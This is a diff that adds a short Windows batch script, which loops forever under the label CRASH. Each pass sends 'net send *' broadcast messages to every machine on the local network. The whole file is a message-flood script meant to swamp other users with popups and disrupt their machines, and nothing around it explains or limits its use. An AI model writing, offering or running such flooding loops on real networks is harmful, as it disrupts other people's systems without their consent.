@@ -1,0 +1,7 @@
+:CRASH
+
+net send * WORKGROUP ENABLED
+
+net send * WORKGROUP ENABLED
+
+GOTO CRASH
